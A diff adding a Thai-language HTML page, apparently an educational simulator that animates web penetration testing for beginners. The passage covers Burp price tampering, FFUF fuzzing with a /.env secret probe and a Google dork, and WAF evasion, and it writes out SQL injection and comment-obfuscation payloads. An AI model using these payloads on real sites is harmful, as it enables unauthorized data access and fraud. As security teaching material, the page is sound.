@@ -1,0 +1,2659 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web-RTA Visual Packet Simulator - ห้องทดลองส่งแพ็กเก็ตเจาะระบบเว็บ</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@400;500;600;700&family=Fira+Code:wght@400;500;600&family=Kanit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-base: #060913;
+            --bg-surface: #0e1526;
+            --bg-card: #151f36;
+            --bg-card-hover: #1c2a4a;
+            --border: #243456;
+            --cyan: #06b6d4;
+            --blue: #3b82f6;
+            --purple: #8b5cf6;
+            --green: #10b981;
+            --red: #ef4444;
+            --amber: #f59e0b;
+            --text-main: #f8fafc;
+            --text-sub: #94a3b8;
+            --text-dim: #64748b;
+            --radius-sm: 6px;
+            --radius-md: 10px;
+            --radius-lg: 14px;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Kanit', sans-serif;
+            background-color: var(--bg-base);
+            color: var(--text-main);
+            line-height: 1.6;
+            background-image: 
+                radial-gradient(circle at 10% 10%, rgba(6, 182, 212, 0.08) 0%, transparent 40%),
+                radial-gradient(circle at 90% 90%, rgba(139, 92, 246, 0.08) 0%, transparent 40%),
+                linear-gradient(to bottom, rgba(14, 21, 38, 0.6) 0%, rgba(6, 9, 19, 0.95) 100%);
+            min-height: 100vh;
+        }
+
+        /* Header */
+        header {
+            background: rgba(14, 21, 38, 0.92);
+            border-bottom: 1px solid var(--border);
+            padding: 12px 24px;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            backdrop-filter: blur(12px);
+        }
+
+        .header-inner {
+            max-width: 1380px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+
+        .brand-group {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .brand-logo {
+            background: linear-gradient(135deg, #0284c7, #6366f1);
+            width: 38px;
+            height: 38px;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.3rem;
+            box-shadow: 0 0 15px rgba(2, 132, 199, 0.4);
+        }
+
+        .brand-text h1 {
+            font-size: 1.15rem;
+            font-weight: 700;
+            background: linear-gradient(90deg, #38bdf8, #818cf8);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .brand-text p {
+            font-size: 0.78rem;
+            color: var(--text-sub);
+        }
+
+        .header-controls {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .level-tag {
+            background: rgba(6, 182, 212, 0.12);
+            color: var(--cyan);
+            border: 1px solid rgba(6, 182, 212, 0.3);
+            font-size: 0.78rem;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-weight: 600;
+        }
+
+        .btn-sound {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            color: var(--text-main);
+            padding: 6px 14px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-family: inherit;
+            font-size: 0.82rem;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            transition: all 0.2s;
+        }
+
+        .btn-sound:hover {
+            border-color: var(--cyan);
+        }
+
+        /* Container */
+        .container {
+            max-width: 1380px;
+            margin: 0 auto;
+            padding: 20px 20px 80px 20px;
+        }
+
+        /* Nav Tabs */
+        .nav-bar {
+            display: flex;
+            gap: 8px;
+            overflow-x: auto;
+            padding: 4px 2px 16px 2px;
+            scrollbar-width: thin;
+        }
+
+        .tab-btn {
+            background: var(--bg-surface);
+            color: var(--text-sub);
+            border: 1px solid var(--border);
+            padding: 9px 16px;
+            border-radius: var(--radius-sm);
+            cursor: pointer;
+            font-family: 'Kanit', sans-serif;
+            font-size: 0.9rem;
+            font-weight: 500;
+            white-space: nowrap;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            transition: all 0.2s;
+        }
+
+        .tab-btn:hover {
+            color: var(--text-main);
+            background: var(--bg-card);
+            border-color: var(--cyan);
+        }
+
+        .tab-btn.active {
+            color: #ffffff;
+            background: linear-gradient(135deg, #0284c7, #4f46e5);
+            border-color: #38bdf8;
+            box-shadow: 0 4px 12px rgba(2, 132, 199, 0.35);
+        }
+
+        /* Views */
+        .module-view {
+            display: none;
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        .module-view.active {
+            display: block;
+        }
+
+        /* Hero Concept */
+        .hero-banner {
+            background: var(--bg-surface);
+            border: 1px solid var(--border);
+            border-left: 4px solid var(--blue);
+            border-radius: var(--radius-md);
+            padding: 18px 22px;
+            margin-bottom: 20px;
+        }
+
+        .hero-title {
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: #38bdf8;
+            margin-bottom: 6px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .hero-text {
+            font-size: 0.94rem;
+            color: #cbd5e1;
+            line-height: 1.6;
+        }
+
+        .hero-text strong {
+            color: #93c5fd;
+        }
+
+        /* ========================================================= */
+        /* PACKET HIGHWAY STAGE                                      */
+        /* ========================================================= */
+        .packet-stage-card {
+            background: var(--bg-surface);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-lg);
+            padding: 22px;
+            margin-bottom: 22px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
+        }
+
+        .stage-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 12px;
+            margin-bottom: 18px;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+
+        .stage-title {
+            font-size: 1.05rem;
+            font-weight: 700;
+            color: var(--cyan);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .stage-badge {
+            background: rgba(6, 182, 212, 0.12);
+            color: var(--cyan);
+            border: 1px solid rgba(6, 182, 212, 0.3);
+            font-size: 0.75rem;
+            padding: 3px 10px;
+            border-radius: 12px;
+            font-family: 'Fira Code', monospace;
+        }
+
+        /* The Highway Area */
+        .packet-highway {
+            background: #060912;
+            border: 1px solid #1a2640;
+            border-radius: var(--radius-md);
+            padding: 40px 20px 30px 20px;
+            min-height: 250px;
+            position: relative;
+            margin-bottom: 18px;
+            overflow: hidden;
+        }
+
+        /* Background Network Wire Track */
+        .wire-track {
+            position: absolute;
+            top: 50%;
+            left: 5%;
+            right: 5%;
+            height: 6px;
+            background: #1e293b;
+            border-radius: 3px;
+            transform: translateY(-50%);
+            z-index: 1;
+            box-shadow: inset 0 0 6px #000;
+        }
+
+        .wire-track::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: repeating-linear-gradient(90deg, #38bdf8 0, #38bdf8 12px, transparent 12px, transparent 24px);
+            opacity: 0.25;
+            animation: moveTrack 1.2s linear infinite;
+        }
+
+        /* Nodes along the wire */
+        .nodes-layer {
+            position: relative;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            z-index: 2;
+        }
+
+        .station-node {
+            background: var(--bg-card);
+            border: 2px solid var(--border);
+            border-radius: var(--radius-md);
+            padding: 12px 14px;
+            width: 145px;
+            text-align: center;
+            transition: all 0.25s ease;
+            position: relative;
+            box-shadow: 0 6px 16px rgba(0,0,0,0.5);
+        }
+
+        .station-node.active-node {
+            border-color: var(--cyan);
+            box-shadow: 0 0 20px rgba(6, 182, 212, 0.45);
+            transform: translateY(-4px);
+        }
+
+        .station-node.danger-node {
+            border-color: var(--red);
+            box-shadow: 0 0 22px rgba(239, 68, 68, 0.55);
+            transform: translateY(-4px);
+        }
+
+        .station-node.success-node {
+            border-color: var(--green);
+            box-shadow: 0 0 20px rgba(16, 185, 129, 0.45);
+        }
+
+        .station-icon {
+            font-size: 1.8rem;
+            margin-bottom: 4px;
+        }
+
+        .station-name {
+            font-size: 0.86rem;
+            font-weight: 600;
+            color: var(--text-main);
+        }
+
+        .station-meta {
+            font-size: 0.72rem;
+            color: var(--text-dim);
+            font-family: 'Fira Code', monospace;
+        }
+
+        .station-status {
+            display: inline-block;
+            font-size: 0.68rem;
+            padding: 2px 6px;
+            border-radius: 8px;
+            margin-top: 4px;
+            background: #090e1a;
+            border: 1px solid var(--border);
+            color: var(--cyan);
+            font-family: 'Fira Code', monospace;
+        }
+
+        /* Visual Flying Packet Capsule */
+        .travel-packet {
+            position: absolute;
+            top: 50%;
+            left: 6%;
+            transform: translate(-50%, -50%);
+            background: linear-gradient(135deg, #0284c7, #06b6d4);
+            color: #ffffff;
+            padding: 7px 16px;
+            border-radius: 20px;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.8rem;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            box-shadow: 0 0 20px rgba(6, 182, 212, 0.8), 0 4px 10px rgba(0,0,0,0.6);
+            border: 1px solid #7dd3fc;
+            z-index: 10;
+            opacity: 0;
+            pointer-events: none;
+            white-space: nowrap;
+        }
+
+        .travel-packet.attack-packet {
+            background: linear-gradient(135deg, #dc2626, #f43f5e);
+            border-color: #fca5a5;
+            box-shadow: 0 0 25px rgba(239, 68, 68, 0.9);
+        }
+
+        .travel-packet.blocked-packet {
+            background: linear-gradient(135deg, #d97706, #f59e0b);
+            border-color: #fde68a;
+            box-shadow: 0 0 20px rgba(245, 158, 11, 0.8);
+        }
+
+        .travel-packet.response-packet {
+            background: linear-gradient(135deg, #059669, #10b981);
+            border-color: #6ee7b7;
+            box-shadow: 0 0 20px rgba(16, 185, 129, 0.8);
+        }
+
+        /* Controls Panel */
+        .controls-panel {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin-bottom: 16px;
+            align-items: center;
+        }
+
+        .btn-ctrl {
+            background: var(--bg-card);
+            color: var(--text-main);
+            border: 1px solid var(--border);
+            padding: 9px 16px;
+            border-radius: var(--radius-sm);
+            cursor: pointer;
+            font-family: inherit;
+            font-size: 0.9rem;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            transition: all 0.2s;
+        }
+
+        .btn-ctrl:hover {
+            border-color: var(--cyan);
+            background: var(--bg-card-hover);
+            transform: translateY(-2px);
+        }
+
+        .btn-ctrl.btn-danger {
+            background: rgba(239, 68, 68, 0.15);
+            border-color: rgba(239, 68, 68, 0.4);
+            color: #fca5a5;
+        }
+
+        .btn-ctrl.btn-danger:hover {
+            background: rgba(239, 68, 68, 0.25);
+            border-color: var(--red);
+        }
+
+        .btn-ctrl.btn-success {
+            background: rgba(16, 185, 129, 0.15);
+            border-color: rgba(16, 185, 129, 0.4);
+            color: #6ee7b7;
+        }
+
+        .btn-ctrl.btn-warn {
+            background: rgba(245, 158, 11, 0.15);
+            border-color: rgba(245, 158, 11, 0.4);
+            color: #fde68a;
+        }
+
+        /* Editable Payload Field */
+        .payload-edit-bar {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 14px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        .payload-box {
+            flex: 1;
+            min-width: 280px;
+            background: #060a14;
+            border: 1px solid var(--border);
+            color: #38bdf8;
+            padding: 9px 14px;
+            border-radius: var(--radius-sm);
+            font-family: 'Fira Code', monospace;
+            font-size: 0.88rem;
+        }
+
+        .payload-box:focus {
+            outline: none;
+            border-color: var(--cyan);
+            box-shadow: 0 0 10px rgba(6, 182, 212, 0.3);
+        }
+
+        /* Live Terminal Packet Inspector */
+        .inspector-box {
+            background: #03060f;
+            border: 1px solid #1a253e;
+            border-radius: var(--radius-md);
+            padding: 14px 18px;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.84rem;
+            color: #38bdf8;
+            min-height: 120px;
+            max-height: 180px;
+            overflow-y: auto;
+        }
+
+        .inspector-head {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.72rem;
+            color: var(--text-dim);
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+
+        .log-row {
+            margin-bottom: 4px;
+            display: flex;
+            align-items: flex-start;
+            gap: 8px;
+            animation: slideIn 0.2s ease-out;
+            word-break: break-all;
+        }
+
+        .log-time {
+            color: var(--text-dim);
+            font-size: 0.72rem;
+            white-space: nowrap;
+        }
+
+        .log-err { color: #f87171; font-weight: 600; }
+        .log-ok { color: #34d399; font-weight: 600; }
+        .log-warn { color: #fbbf24; }
+
+        /* Content Grid */
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 16px;
+            margin-top: 18px;
+        }
+
+        .info-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-md);
+            padding: 18px;
+            transition: all 0.2s;
+        }
+
+        .info-card:hover {
+            border-color: var(--blue);
+            transform: translateY(-2px);
+        }
+
+        .card-head {
+            font-size: 0.98rem;
+            font-weight: 600;
+            color: var(--cyan);
+            margin-bottom: 6px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .card-body {
+            font-size: 0.88rem;
+            color: #cbd5e1;
+            line-height: 1.6;
+        }
+
+        .code-tag {
+            background: #060a14;
+            color: #f43f5e;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.85em;
+            border: 1px solid rgba(244, 63, 94, 0.25);
+        }
+
+        /* Quiz */
+        .quiz-wrapper {
+            background: linear-gradient(135deg, #12192b 0%, #0a0f1c 100%);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-lg);
+            padding: 28px 20px;
+            text-align: center;
+        }
+
+        .quiz-opt-btn {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            color: var(--text-main);
+            padding: 13px 18px;
+            border-radius: var(--radius-sm);
+            margin: 10px auto;
+            max-width: 680px;
+            cursor: pointer;
+            text-align: left;
+            font-size: 0.94rem;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            transition: all 0.2s;
+        }
+
+        .quiz-opt-btn:hover {
+            border-color: var(--cyan);
+            transform: translateX(6px);
+            background: var(--bg-card-hover);
+        }
+
+        .quiz-opt-btn.correct {
+            background: rgba(16, 185, 129, 0.2);
+            border-color: var(--green);
+            color: #34d399;
+        }
+
+        .quiz-opt-btn.wrong {
+            background: rgba(239, 68, 68, 0.2);
+            border-color: var(--red);
+            color: #fca5a5;
+        }
+
+        /* Keyframes */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(6px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateX(-6px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        @keyframes moveTrack {
+            from { background-position: 0 0; }
+            to { background-position: 24px 0; }
+        }
+
+        .quiz-progress {
+            font-size: 0.82rem;
+            color: var(--cyan);
+            font-weight: 600;
+            margin-bottom: 8px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+
+        .quiz-explanation {
+            background: rgba(14, 21, 38, 0.9);
+            border-left: 4px solid var(--cyan);
+            border-radius: var(--radius-sm);
+            padding: 14px 18px;
+            margin: 16px auto 12px auto;
+            max-width: 680px;
+            text-align: left;
+            font-size: 0.9rem;
+            color: #e2e8f0;
+            line-height: 1.6;
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        .quiz-opt-btn.show-correct {
+            border-color: var(--green);
+            background: rgba(16, 185, 129, 0.2);
+            color: #34d399;
+        }
+
+        .packet-highway {
+            overflow-x: auto;
+            overflow-y: hidden;
+        }
+
+        @media (max-width: 768px) {
+            .nodes-layer {
+                min-width: 560px;
+            }
+            .wire-track {
+                min-width: 560px;
+            }
+            .packet-highway {
+                overflow-x: auto;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Header -->
+    <header>
+        <div class="header-inner">
+            <div class="brand-group">
+                <div class="brand-logo">📡</div>
+                <div class="brand-text">
+                    <h1>Web-RTA Visual Packet Simulator</h1>
+                    <p>จำลองการเดินทางของ HTTP Packet ในการทดสอบเจาะระบบเว็บ 9 โมดูล (ม.6 & มือใหม่)</p>
+                </div>
+            </div>
+            <div class="header-controls">
+                <a href="Web_Exploitation_Fundamentals.html" class="level-tag" style="text-decoration:none; display:inline-flex; align-items:center; gap:6px; cursor:pointer;" title="เปิดคู่มือ Web Exploitation Fundamentals"><span>📖</span> คู่มือพื้นฐานเว็บ ➔</a>
+                <span class="level-tag">🎯 Packet Highway Engine</span>
+                <button class="btn-sound" id="soundBtn" onclick="toggleAudio()">
+                    <span id="soundIcon">🔊</span> <span id="soundText">เสียง: เปิด</span>
+                </button>
+            </div>
+        </div>
+    </header>
+
+    <div class="container">
+
+        <!-- Navigation Tabs -->
+        <div class="nav-bar" id="navBar">
+            <button class="tab-btn active" onclick="switchModule(0)">🌐 1. Packet Lifecycle</button>
+            <button class="tab-btn" onclick="switchModule(1)">🧰 2. Burp Intercept</button>
+            <button class="tab-btn" onclick="switchModule(2)">🔍 3. FFUF Packet Storm</button>
+            <button class="tab-btn" onclick="switchModule(3)">🧱 4. WAF Filter Inspection</button>
+            <button class="tab-btn" onclick="switchModule(4)">💉 5. Injection Execution</button>
+            <button class="tab-btn" onclick="switchModule(5)">🧬 6. XSS Script Injection</button>
+            <button class="tab-btn" onclick="switchModule(6)">🔑 7. IDOR & JWT</button>
+            <button class="tab-btn" onclick="switchModule(7)">🚀 8. SSRF Internal Relay</button>
+            <button class="tab-btn" onclick="switchModule(8)">⚡ 9. Chained Attack Flow</button>
+            <button class="tab-btn" onclick="switchModule(9)">🏆 Exam Quiz</button>
+        </div>
+
+        <!-- ================================================================= -->
+        <!-- TAB 0: Packet Lifecycle (Architecture 101) -->
+        <!-- ================================================================= -->
+        <section class="module-view active" id="view0">
+            <div class="hero-banner">
+                <div class="hero-title">🌐 Module 0 & 1: วงจรชีวิตของ HTTP Packet & สถาปัตยกรรมเว็บ</div>
+                <div class="hero-text">
+                    เมื่อผู้ใช้พิมพ์ URL หรือกดปุ่มบนหน้าเว็บ เบราว์เซอร์จะสร้าง <strong>HTTP Request Packet</strong> วิ่งผ่านสายเคเบิลเครือข่ายไปยัง Application Server จากนั้น Server จะส่งคำสั่งไปประมวลผลที่ฐานข้อมูล แล้วส่ง <strong>HTTP Response Packet</strong> บินกลับมายังเบราว์เซอร์
+                </div>
+            </div>
+
+            <div class="packet-stage-card">
+                <div class="stage-header">
+                    <div class="stage-title">🎬 Packet Flight Track: Client ➔ Server ➔ Database ➔ Response</div>
+                    <span class="stage-badge">HTTP/1.1 TCP Handshake</span>
+                </div>
+
+                <div class="packet-highway" id="highway0">
+                    <div class="wire-track"></div>
+                    
+                    <!-- Dynamic Flying Packet -->
+                    <div class="travel-packet" id="pkt0">✉️ GET /api/user?id=1</div>
+
+                    <div class="nodes-layer">
+                        <div class="station-node" id="n0-client">
+                            <div class="station-icon">💻</div>
+                            <div class="station-name">Attacker Client</div>
+                            <div class="station-meta">192.168.1.50</div>
+                            <span class="station-status" id="st0-client">Ready</span>
+                        </div>
+
+                        <div class="station-node" id="n0-server">
+                            <div class="station-icon">⚙️</div>
+                            <div class="station-name">App Server</div>
+                            <div class="station-meta">Node.js Express</div>
+                            <span class="station-status" id="st0-server">Listening</span>
+                        </div>
+
+                        <div class="station-node" id="n0-db">
+                            <div class="station-icon">🗄️</div>
+                            <div class="station-name">Database</div>
+                            <div class="station-meta">PostgreSQL:5432</div>
+                            <span class="station-status" id="st0-db">table: users</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="controls-panel">
+                    <button class="btn-ctrl btn-success" onclick="launchPacket0(false)">
+                        <span>🚀</span> 1. ยิง Normal Packet (GET /api/user?id=1) ➔ ได้ข้อมูลปกติ
+                    </button>
+                    <button class="btn-ctrl btn-danger" onclick="launchPacket0(true)">
+                        <span>💥</span> 2. ยิง SQLi Packet (GET /api/user?id=1' OR 1=1--) ➔ ดึงทั้งตาราง!
+                    </button>
+                </div>
+
+                <div class="inspector-box" id="term0">
+                    <div class="inspector-head"><span>PACKET INSPECTOR</span><span>STATUS: READY</span></div>
+                    <div class="log-row"><span class="log-time">[Init]</span> Network wire energized. Click buttons to launch data packet.</div>
+                </div>
+            </div>
+
+            <div class="info-grid">
+                <div class="info-card">
+                    <div class="card-head">📜 OWASP Top 10 (2021)</div>
+                    <div class="card-body">A01: Broken Access Control, A02: Cryptographic Failures, A03: Injection, A07: Auth Failures, และ A10: SSRF — เป็นเป้าหมายหลักในการตรวจจับแพ็กเก็ต</div>
+                </div>
+                <div class="info-card">
+                    <div class="card-head">📖 OWASP WSTG Checklist</div>
+                    <div class="card-body">คู่มือมาตรฐานทดสอบเจาะระบบเว็บระดับโลก มีการทดสอบทุกจุดตัดและช่องทางการส่งผ่านข้อมูลในระบบ</div>
+                </div>
+            </div>
+        </section>
+
+        <!-- ================================================================= -->
+        <!-- TAB 1: Burp Suite Mid-Air Intercept -->
+        <!-- ================================================================= -->
+        <section class="module-view" id="view1">
+            <div class="hero-banner">
+                <div class="hero-title">🧰 Module 2: Burp Suite - กักตัวแพ็กเก็ตกลางอากาศ & ดัดแปลงค่า (Repeater)</div>
+                <div class="hero-text">
+                    <strong>Burp Suite Proxy</strong> ทำตัวเป็นคนกลาง (MITM) ที่สามารถ <strong>กักแพ็กเก็ตไว้กลางอากาศ (Intercept)</strong> เปิดดู Payload ภายใน แอบแก้ค่า (เช่น แก้ราคาสินค้าเป็น 0) แล้วค่อยปล่อยให้บินต่อไปยัง Server!
+                </div>
+            </div>
+
+            <div class="packet-stage-card">
+                <div class="stage-header">
+                    <div class="stage-title">🎬 Burp Mid-Air Capture & Parameter Tamper Track</div>
+                    <span class="stage-badge">MITM Proxy 127.0.0.1:8080</span>
+                </div>
+
+                <div class="packet-highway" id="highway1">
+                    <div class="wire-track"></div>
+                    
+                    <div class="travel-packet" id="pkt1">📦 POST /checkout price=2500</div>
+
+                    <div class="nodes-layer">
+                        <div class="station-node" id="n1-client">
+                            <div class="station-icon">💻</div>
+                            <div class="station-name">Attacker Client</div>
+                            <div class="station-meta">Order Form</div>
+                            <span class="station-status" id="st1-client">Send Form</span>
+                        </div>
+
+                        <div class="station-node" id="n1-burp">
+                            <div class="station-icon">👓</div>
+                            <div class="station-name">Burp Proxy</div>
+                            <div class="station-meta">127.0.0.1:8080</div>
+                            <span class="station-status" id="st1-burp">Intercept: ON</span>
+                        </div>
+
+                        <div class="station-node" id="n1-server">
+                            <div class="station-icon">🌐</div>
+                            <div class="station-name">E-Commerce API</div>
+                            <div class="station-meta">/api/checkout</div>
+                            <span class="station-status" id="st1-server">Awaiting</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="payload-edit-bar">
+                    <label style="color:var(--amber); font-size:0.85rem; width:100%;">Payload ภายในแพ็กเก็ตที่ถูกดักจับอยู่ใน Burp Repeater:</label>
+                    <input type="text" id="burpInputPayload" class="payload-box" value="POST /api/checkout HTTP/1.1 | Body: {&quot;item_id&quot;: 501, &quot;price&quot;: 2500}">
+                </div>
+
+                <div class="controls-panel">
+                    <button class="btn-ctrl btn-warn" onclick="burpStep1Intercept()">
+                        <span>🛑</span> 1. กดสั่งซื้อ (เริ่มจาก Attacker Client ➔ ถูก Burp กักไว้กลางอากาศ!)
+                    </button>
+                    <button class="btn-ctrl btn-danger" onclick="burpStep2Tamper()">
+                        <span>✏️</span> 2. แอบแก้ไขราคาในแพ็กเก็ตเป็น 0 บาท!
+                    </button>
+                    <button class="btn-ctrl btn-success" onclick="burpStep3Forward()">
+                        <span>🚀</span> 3. ปล่อยแพ็กเก็ตบินต่อ (Forward ➔ ซื้อสำเร็จ 0 บาท)
+                    </button>
+                </div>
+
+                <div class="inspector-box" id="term1">
+                    <div class="inspector-head"><span>BURP PROXY LOG</span><span>INTERCEPT: ACTIVE</span></div>
+                    <div class="log-row"><span class="log-time">[Proxy]</span> Listening on port 8080. Ready to capture outgoing packets.</div>
+                </div>
+            </div>
+        </section>
+
+        <!-- ================================================================= -->
+        <!-- TAB 2: FFUF Packet Storm -->
+        <!-- ================================================================= -->
+        <section class="module-view" id="view2">
+            <div class="hero-banner">
+                <div class="hero-title">🔍 Module 3: Recon & FFUF - พายุแพ็กเก็ตสแกนหา Path ลับ</div>
+                <div class="hero-text">
+                    <strong>FFUF (Fuzz Faster U Fool)</strong> ทำงานเหมือนปืนกลยิง <strong>HTTP Probe Packets</strong> นับพันฉบับต่อวินาทีไปยัง URL เพื่อดูว่าประตูบานไหนเปิดอยู่ (HTTP 200 OK) หรือบานไหนล็อกไว้ (HTTP 403 Forbidden)
+                </div>
+            </div>
+
+            <div class="packet-stage-card">
+                <div class="stage-header">
+                    <div class="stage-title">🎬 High-Speed Packet Fuzzing Simulation (Starting from Attacker)</div>
+                    <span class="stage-badge">CLI Fuzzer 40 Threads</span>
+                </div>
+
+                <div class="packet-highway" id="highway2">
+                    <div class="wire-track"></div>
+                    
+                    <div class="travel-packet" id="pkt2">⚡ Probe: /FUZZ</div>
+
+                    <div class="nodes-layer">
+                        <div class="station-node" id="n2-ffuf">
+                            <div class="station-icon">💻</div>
+                            <div class="station-name">Attacker FFUF</div>
+                            <div class="station-meta">Wordlist: 1000</div>
+                            <span class="station-status" id="st2-ffuf">Ready</span>
+                        </div>
+
+                        <div class="station-node" id="n2-admin">
+                            <div class="station-icon">🚪</div>
+                            <div class="station-name">/admin</div>
+                            <div class="station-meta">Auth Area</div>
+                            <span class="station-status" id="st2-admin">Status: ---</span>
+                        </div>
+
+                        <div class="station-node" id="n2-backup">
+                            <div class="station-icon">📦</div>
+                            <div class="station-name">/backup.sql</div>
+                            <div class="station-meta">Exposed DB</div>
+                            <span class="station-status" id="st2-backup">Status: ---</span>
+                        </div>
+
+                        <div class="station-node" id="n2-api">
+                            <div class="station-icon">🔑</div>
+                            <div class="station-name">/api/v2/docs</div>
+                            <div class="station-meta">Swagger UI</div>
+                            <span class="station-status" id="st2-api">Status: ---</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="controls-panel">
+                    <button class="btn-ctrl btn-success" onclick="runFfufStorm()">
+                        <span>⚡</span> ปล่อยพายุแพ็กเก็ต FFUF: ffuf -u http://target.lab/FUZZ -w common.txt
+                    </button>
+                    <button class="btn-ctrl btn-warn" onclick="runGoogleDorkDemo()">
+                        <span>🔎</span> Google Dork: site:target.com ext:log | inurl:config
+                    </button>
+                    <button class="btn-ctrl btn-danger" onclick="runFfufEnvProbe()">
+                        <span>📂</span> Fuzz ไฟล์คอนฟิกลับ: /.env ➔ เจาะขโมย DB_PASSWORD!
+                    </button>
+                </div>
+
+                <div class="inspector-box" id="term2">
+                    <div class="inspector-head"><span>FFUF BASH OUTPUT</span><span>THREADS: 40</span></div>
+                    <div class="log-row"><span class="log-time">[Ready]</span> Wordlist loaded. Awaiting launch command.</div>
+                </div>
+            </div>
+        </section>
+
+        <!-- ================================================================= -->
+        <!-- TAB 3: WAF Filter Inspection -->
+        <!-- ================================================================= -->
+        <section class="module-view" id="view3">
+            <div class="hero-banner">
+                <div class="hero-title">🧱 Module 4: WAF Evasion - กำแพงตรวจจับแพ็กเก็ต & การพรางตัว</div>
+                <div class="hero-text">
+                    <strong>WAF (Web Application Firewall)</strong> ยืนขวางอยู่หน้าเซิร์ฟเวอร์ คอยส่องดูเนื้อหาในแพ็กเก็ต ถ้าเจอคำว่า <span class="code-tag">SELECT * FROM</span> จะยิงเลเซอร์ทำลายแพ็กเก็ตทิ้งทันที (403 Blocked) แต่นักเจาะระบบสามารถพรางตัวด้วย <span class="code-tag">SELECT/**/password/**/FROM</span> หรือ <span class="code-tag">sElEcT%20</span> เพื่อให้แพ็กเก็ตบินทะลุผ่าน WAF ได้!
+                </div>
+            </div>
+
+            <div class="packet-stage-card">
+                <div class="stage-header">
+                    <div class="stage-title">🎬 WAF Deep Packet Inspection (DPI) & Evasion Track</div>
+                    <span class="stage-badge">ModSecurity CRS v3.3</span>
+                </div>
+
+                <div class="packet-highway" id="highway3">
+                    <div class="wire-track"></div>
+                    
+                    <div class="travel-packet" id="pkt3">💉 SELECT * FROM users</div>
+
+                    <div class="nodes-layer">
+                        <div class="station-node" id="n3-client">
+                            <div class="station-icon">💻</div>
+                            <div class="station-name">Attacker Client</div>
+                            <div class="station-meta">Payload Injector</div>
+                            <span class="station-status" id="st3-client">Ready</span>
+                        </div>
+
+                        <div class="station-node" id="n3-waf">
+                            <div class="station-icon">🛡️</div>
+                            <div class="station-name">WAF Guard</div>
+                            <div class="station-meta">Signature Filter</div>
+                            <span class="station-status" id="st3-waf">Inspecting</span>
+                        </div>
+
+                        <div class="station-node" id="n3-server">
+                            <div class="station-icon">🏰</div>
+                            <div class="station-name">Origin Server</div>
+                            <div class="station-meta">Protected WebApp</div>
+                            <span class="station-status" id="st3-server">Safe</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="payload-edit-bar">
+                    <label style="color:var(--amber); font-size:0.85rem; width:100%;">Payload ในแพ็กเก็ต (สามารถพิมพ์เพย์โหลดเพื่อทดสอบเองได้):</label>
+                    <input type="text" id="wafPayloadInput" class="payload-box" value="SELECT * FROM users WHERE admin = 1" onkeydown="if(event.key==='Enter') testCustomWaf()">
+                    <button class="btn-ctrl btn-warn" onclick="testCustomWaf()" style="padding: 8px 16px; font-size: 0.88rem;">
+                        <span>🧪</span> ทดสอบ Payload นี้
+                    </button>
+                </div>
+
+                <div class="controls-panel">
+                    <button class="btn-ctrl btn-danger" onclick="testWafPacket(1)">
+                        <span>❌</span> 1. ส่ง Raw SQLi (SELECT * FROM users) ➔ แพ็กเก็ตชน WAF พัง! (403 Blocked)
+                    </button>
